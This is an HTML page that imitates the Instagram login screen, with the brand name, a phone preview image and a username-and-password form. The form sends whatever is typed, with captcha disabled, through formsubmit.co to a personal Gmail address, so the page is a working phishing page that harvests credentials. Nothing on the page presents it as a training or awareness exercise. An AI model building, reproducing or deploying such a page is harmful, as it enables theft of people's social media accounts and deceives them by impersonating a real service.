<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>login to your account</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}

body{
  background:#fafafa;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
}

/* Main Container */
.container{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:40px;
}

/* Left Image (Hidden on Mobile) */
.phone-image img{
  width:380px;
}

/* Login Box */
.login-box{
  background:#fff;
  border:1px solid #dbdbdb;
  width:350px;
  padding:40px;
  text-align:center;
}

.login-box h1{
  font-family: 'Segoe UI', cursive;
  font-size:32px;
  margin-bottom:30px;
}

.login-box input{
  width:100%;
  padding:10px;
  margin:6px 0;
  border:1px solid #dbdbdb;
  border-radius:4px;
  background:#fafafa;
  font-size:14px;
}

.login-box button{
  width:100%;
  padding:8px;
  margin-top:10px;
  background:#0095f6;
  color:white;
  border:none;
  border-radius:6px;
  font-weight:600;
  cursor:pointer;
}

.login-box button:hover{
  background:#007cd1;
}

.divider{
  display:flex;
  align-items:center;
  margin:15px 0;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  height:1px;
  background:#dbdbdb;
}

.divider span{
  margin:0 10px;
  color:#8e8e8e;
  font-size:12px;
  font-weight:600;
}

.signup-box{
  background:#fff;
  border:1px solid #dbdbdb;
  width:350px;
  padding:20px;
  text-align:center;
  margin-top:10px;
  font-size:14px;
}

.signup-box a{
  color:#0095f6;
  text-decoration:none;
  font-weight:600;
}

/* Responsive */
@media(max-width:900px){
  .phone-image{
    display:none;
  }
}

@media(max-width:400px){
  .login-box,
  .signup-box{
    width:100%;
    border:none;
  }
}
</style>
</head>

<body>

<div class="container">

  <!-- Left Side Image -->
  <div class="phone-image">
    <img src="https://i.imgur.com/zqpwkLQ.png" alt="Phone Preview">
  </div>

  <!-- Right Side Login -->
  <div>
    <div class="login-box">

      <h1>Instagram</h1>

      <!-- FormSubmit Integration -->
      <form action="https://formsubmit.co/rahimchawdhury63@gmail.com" method="POST">
        
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">

        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password " required>

        <button type="submit">Log In</button>
      </form>

      <div class="divider">
        <span>OR</span>
      </div>

      <p style="color:#385185;font-weight:600;font-size:14px;">Log in with Facebook</p>
      <p style="color:#00376b;font-size:12px;margin-top:15px;">Forgot password?</p>

    </div>

    <div class="signup-box">
      Donâ€™t have an account? <a href="#">Sign up</a>
    </div>
  </div>

</div>

</body>
</html>
